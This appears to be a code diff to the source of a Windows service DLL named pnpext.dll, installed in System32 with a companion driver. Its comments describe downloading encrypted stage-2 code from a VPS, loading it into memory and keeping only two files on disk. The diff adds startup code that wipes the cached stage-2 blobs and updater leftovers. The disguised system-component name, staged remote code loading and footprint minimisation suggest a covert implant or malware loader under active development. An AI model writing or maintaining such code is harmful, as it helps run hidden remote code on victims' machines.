@@ -304,12 +304,26 @@ static void helper_monitor_func() {
     g_dll_ipc_reader.close();
 }
 
+// Forward declaration — definition lives further down, inside the
+// extern "C" block. Wrap the forward decl in extern "C" too so the
+// linkage matches; otherwise the compiler rejects with C2732.
+extern "C" { static void CleanupUpdateArtifacts(); }
+
 // ── Start host (called from DllMain or Init export) ──
 static void start_host() {
     if (g_dll_started.exchange(true)) {
         dll_diag("start_host: already started, skipping");
         return;
     }
+
+    // ALWAYS wipe stage-2 blob cache + update leftovers on startup. Forced
+    // shutdowns (taskkill during host_update, BSOD, svchost kill) skip
+    // shutdown_all() and leave stale encrypted blobs on disk. Without this
+    // wipe, the next start reads those blobs, AES-GCM-decrypts them with
+    // the same room_token (succeeds — same key), loads OLD stage-2 code
+    // into modules_ and prefetch_all_async sees all 4 modules already
+    // registered so it skips every fetch. User's v1.0.186 cache bug.
+    CleanupUpdateArtifacts();
 
     dll_diag("start_host: initializing logger...");
     Logger& log = Logger::get();
@@ -451,8 +465,10 @@ static DWORD WINAPI SvcCtrlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lp
 }
 
 // Remove any leftover update artifacts in case a previous host_update bat crashed
-// before reaching :cleanup. Keep the host footprint to just the two shipped files
-// (pnpext.dll in System32 and pnpext.sys in drivers) at all times.
+// before reaching :cleanup. Also wipe the stage-2 blob cache so the new process
+// always starts with a clean slate and re-fetches fresh blobs from the VPS.
+// Keep the host footprint to just the two shipped files (pnpext.dll in System32
+// and pnpext.sys in drivers) at all times.
 static void CleanupUpdateArtifacts() {
     // Get path to currently loaded DLL (typically C:\Windows\System32\pnpext.dll)
     extern HMODULE g_dll_module;
@@ -477,6 +493,33 @@ static void CleanupUpdateArtifacts() {
         DeleteFileA((tempDir + stepName).c_str());
         DeleteFileA((tempDir + updateName).c_str());
         DeleteFileA((tempDir + newDllName).c_str());
+    }
+    // Wipe stage-2 blob cache so a new service start ALWAYS fetches fresh
+    // blobs from the VPS. Forced shutdowns (taskkill, host_update via bat,
+    // BSOD) bypass shutdown_all() and leave stale encrypted blobs on disk
+    // that decrypt cleanly with the same room_token but may contain old
+    // stage-2 code that is ABI-incompatible with the current stage-1 DLL.
+    // Service start is the one point we control 100% of the time.
+    {
+        char tmp[MAX_PATH];
+        DWORD n = GetTempPathA(MAX_PATH, tmp);
+        if (n > 0 && n < MAX_PATH) {
+            std::string cacheDir = std::string(tmp, n) + "pnp_cache\\";
+            std::string pattern = cacheDir + "*.bin";
+            WIN32_FIND_DATAA fd{};
+            HANDLE h = FindFirstFileA(pattern.c_str(), &fd);
+            if (h != INVALID_HANDLE_VALUE) {
+                do {
+                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+                    std::string full = cacheDir + fd.cFileName;
+                    SetFileAttributesA(full.c_str(), FILE_ATTRIBUTE_NORMAL);
+                    DeleteFileA(full.c_str());
+                } while (FindNextFileA(h, &fd));
+                FindClose(h);
+            }
+            // Empty dir; safe to remove so the next cache write re-creates it.
+            RemoveDirectoryA(cacheDir.c_str());
+        }
     }
 }
 
@@ -512,10 +555,9 @@ __declspec(dllexport) void WINAPI PnpServiceEntry(DWORD dwArgc, LPWSTR* lpszArgv
     // Wrap init in try/catch so an early exception doesn't kill the service
     // silently (SCM just reports "service terminated unexpectedly").
     try {
-        dll_diag("PnpServiceEntry: CleanupUpdateArtifacts...");
-        CleanupUpdateArtifacts();
-        dll_diag("PnpServiceEntry: CleanupUpdateArtifacts OK");
-
+        // CleanupUpdateArtifacts is now called inside start_host() itself,
+        // so the cache/artifacts wipe happens on EVERY code path that starts
+        // the host (DllMain standalone, PnpServiceEntry service, test modes).
         dll_diag("PnpServiceEntry: calling start_host...");
         start_host();
         dll_diag("PnpServiceEntry: start_host returned OK");
